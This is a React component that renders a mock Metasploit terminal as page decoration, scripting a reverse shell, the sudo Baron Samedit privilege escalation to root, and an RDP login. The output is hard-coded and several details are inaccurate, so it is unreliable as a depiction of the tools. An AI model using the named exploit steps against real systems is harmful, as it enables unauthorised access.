export const Terminal = () => {
  return (
    <div className="font-mono text-sm md:text-base selection:bg-emerald-500/30">
      {/* Connection Sequence */}
      <div className="mb-6">
        <div className="flex gap-2">
          <span className="text-gray-500">msf6 exploit(</span>
          <span className="text-red-500">handler</span>
          <span className="text-gray-500">) &gt;</span>
          <span className="text-white">run</span>
        </div>
        <div className="text-blue-400">
          [*] Started reverse TCP handler on 127.0.0.1:4444
        </div>
        <div className="text-blue-400">
          [*] Sending stage (175686 bytes) to 192.168.1.1
        </div>
        <div className="text-emerald-400 font-bold">
          [*] Meterpreter session 1 opened (127.0.0.1:4444 -&gt;
          192.168.1.1:5678)
        </div>
      </div>

      {/* Privilege Escalation */}
      <div className="mb-6">
        <div className="flex gap-2">
          <span className="text-emerald-500">meterpreter </span>
          <span className="text-gray-500">&gt; </span>
          <span className="text-white">getuid </span>
        </div>
        <div>
          <p>Server username: ubuntu-workstation\low-priv-user</p>
        </div>
      </div>

      <div className="mb-6">
        <div className="flex gap-2">
          <span className="text-emerald-500">meterpreter </span>
          <span className="text-gray-500">&gt; </span>
          <span className="text-white">run </span>
          <span className="text-white break-all md:break-normal">
            post/multi/recon/local_exploit_suggester
          </span>
        </div>
        <div className="text-blue-400">
          [*] 192.168.1.1 - Collecting local exploits...
        </div>
        <div className="text-blue-400">
          [+] 192.168.1.1 - exploit/linux/local/sudo_baron_samedit: Valid
        </div>
      </div>

      <div className="mb-6">
        <div className="flex gap-2">
          <span className="text-emerald-500">meterpreter </span>
          <span className="text-gray-500">&gt; </span>
          <span className="text-white">use </span>
          <span className="text-white break-all md:break-normal">
            exploit/linux/local/sudo_baron_samedit
          </span>
        </div>
        <div className="flex gap-2">
          <span className="text-emerald-500">meterpreter </span>
          <span className="text-gray-500">&gt; </span>
          <span className="text-white">run </span>
        </div>
        <div className="text-blue-400">[+] Escalating privileges...</div>
        <div className="text-emerald-400">[+] Success! Target compromised.</div>
      </div>

      <div className="mb-6">
        <div className="flex gap-2">
          <span className="text-emerald-500">meterpreter </span>
          <span className="text-gray-500">&gt; </span>
          <span className="text-white">getuid </span>
        </div>
        <div>
          <p>Server username: root</p>
        </div>
      </div>

      {/* Starting RDP */}
      <div className="flex gap-2">
        <span className="text-emerald-500">meterpreter </span>
        <span className="text-gray-500">&gt; </span>
        <span className="text-white">run </span>
        <span className="text-white break-all md:break-normal">
          post/multi/manage/open_rdp_session
        </span>
      </div>
      <div className="text-blue-400">
        [*] Target: UBUNTU-WORKSTATION-01 (192.168.1.1)
      </div>
      <div className="text-blue-400">
        [*] Authenticating with local session tokens...
      </div>
      <div className="text-emerald-400 font-bold">
        [*] Access Granted. Initializing GUI...
        <span className="inline-block w-2 h-4 bg-white ml-1 animate-cursor align-middle" />
      </div>
    </div>
  );
};
